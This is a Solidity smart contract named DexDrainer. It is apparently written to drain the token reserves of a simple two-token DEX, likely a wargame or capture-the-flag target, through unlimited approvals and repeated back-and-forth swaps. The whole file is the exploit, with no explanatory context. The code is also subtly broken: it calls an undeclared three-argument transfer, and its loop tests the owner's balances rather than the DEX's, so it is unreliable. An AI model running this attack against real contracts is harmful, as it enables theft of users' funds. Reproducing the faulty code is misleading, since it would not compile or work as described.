pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface ISwappableToken {
    function approve(address owner, address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}


contract DexDrainer {
    address public immutable instance;
    address public owner;

    address public immutable token1;
    address public immutable token2;

    constructor(address _dexInstance) {
        instance = _dexInstance;
        token1 = IDex(instance).token1();
        token2 = IDex(instance).token2();
        owner = msg.sender;
    }

    function drain() external {
        // Grant approval for unlimited liquidity to the dex contract
        ISwappableToken(token1).approve(owner, instance, type(uint256).max);
        ISwappableToken(token2).approve(owner, instance, type(uint256).max);

        while (IERC20(token1).balanceOf(owner) + IERC20(token2).balanceOf(owner) > 0) {
            uint256 balance1 = IERC20(token1).balanceOf(owner);
            if (balance1 > 0) {
                IERC20(token1).transfer(owner, instance, balance1);
                IDex(instance).swap(token1, token2, balance1);
            }

            uint256 balance2 = IERC20(token2).balanceOf(owner);
            if (balance2 > 0) {
                IERC20(token2).transfer(owner, instance, balance2);
                IDex(instance).swap(token2, token1, balance2);
            }
        }
    }
}